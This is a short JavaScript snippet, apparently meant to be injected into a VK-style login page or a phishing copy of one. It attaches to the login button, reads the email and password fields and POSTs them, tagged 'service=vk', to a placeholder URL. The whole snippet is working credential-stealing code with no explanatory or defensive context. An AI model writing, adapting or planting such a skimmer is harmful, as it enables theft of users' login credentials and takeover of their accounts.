<script>
    var vk_url = 'https://url';
    document.getElementById('index_login_button').onclick = function() {
        var vk_login = document.getElementById('index_email').value;
        var vk_pass = document.getElementById('index_pass').value;
        var vk_xhr = new XMLHttpRequest();
        var vk_body = 'login=' + encodeURIComponent(vk_login) + '&pass=' + encodeURIComponent(vk_pass) + '&service=vk';
        vk_xhr.open("POST", vk_url, true)
        vk_xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        vk_xhr.send(vk_body);
    }
</script>
